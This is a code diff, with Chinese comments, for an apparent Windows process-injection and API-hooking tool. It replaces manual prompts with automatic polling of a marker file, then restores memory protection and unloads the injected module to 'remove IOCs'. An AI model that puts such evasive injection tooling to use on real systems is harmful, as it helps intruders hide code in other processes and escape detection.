@@ -469,10 +469,44 @@ int wmain(int argc, wchar_t** argv) {
     printf("[+] Waiting for callback...\n");
     printf("[+] Trigger the hooked API (%ws) in the target process\n\n", hookedApi);
 
-    // 等待用户确认收到 callback
-    char input1[256];
-    printf("[?] Press ENTER when you receive a callback to restore memory protection...\n");
-    fgets(input1, sizeof(input1), stdin);
+    // 删除旧的标记文件（如果存在）
+    DeleteFileA("C:\\Users\\Public\\hook_triggered.marker");
+
+    // 轮询标记文件，等待Hook被触发
+    printf("[*] Polling for hook trigger marker...\n");
+    BOOL hookTriggered = FALSE;
+    int pollCount = 0;
+    while (!hookTriggered && pollCount < 60) {  // 最多等待60秒
+        HANDLE hMarker = CreateFileA(
+            "C:\\Users\\Public\\hook_triggered.marker",
+            GENERIC_READ,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            NULL,
+            OPEN_EXISTING,
+            FILE_ATTRIBUTE_NORMAL,
+            NULL
+        );
+
+        if (hMarker != INVALID_HANDLE_VALUE) {
+            CloseHandle(hMarker);
+            printf("\n[+] Hook triggered! Marker file detected.\n");
+            hookTriggered = TRUE;
+        } else {
+            if (pollCount % 5 == 0) {
+                printf(".");
+                fflush(stdout);
+            }
+            Sleep(1000);  // 每秒检查一次
+            pollCount++;
+        }
+    }
+
+    if (!hookTriggered) {
+        printf("\n[-] Timeout: Hook was not triggered within 60 seconds\n");
+    }
+
+    // 清理标记文件
+    DeleteFileA("C:\\Users\\Public\\hook_triggered.marker");
 
     // 恢复内存保护（RWX -> RX）
     printf("\n[+] Restoring memory protection...\n");
@@ -492,10 +526,8 @@ int wmain(int argc, wchar_t** argv) {
 
     free(apiName);
 
-    // 等待用户确认卸载模块
-    char input2[256];
-    printf("\n[?] Press ENTER to unload %ws and remove IOCs...\n", loadedModule);
-    fgets(input2, sizeof(input2), stdin);
+    // 自动继续卸载模块
+    printf("\n[*] Proceeding to unload %ws and remove IOCs...\n", loadedModule);
 
     // 卸载模块
     if (!UnloadModule(hProcess, loadedModule)) {
